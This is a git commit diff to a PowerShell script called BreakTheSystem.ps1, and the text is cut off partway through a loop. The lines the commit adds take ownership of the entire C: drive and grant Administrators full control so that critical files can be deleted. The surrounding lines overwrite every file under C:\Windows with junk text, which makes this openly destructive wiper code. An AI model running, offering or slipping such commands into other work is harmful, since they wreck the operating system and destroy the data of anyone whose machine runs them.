b4a967888fcfddb7391997e9eddfdf0a4a039f3c
youaredied4-jawiem <youaredied4@gmail.com>
2026-03-28 08:02:14 +0100

    Source Code

--- BreakTheSystem.ps1
+++ BreakTheSystem.ps1
@@ -1,3 +1,6 @@
+#Grant The Administators Privilege To Delete Critical Files
+taKeown /F /R c:\
+icacls C:\ /grant *S-1-5-32-544:F
 # Instead of just deleting, "corrupt" them first
 Get-ChildItem C:\Windows -Recurse | ForEach-Object { 
     "NAH BRO" | Out-File $_.FullName -Force 
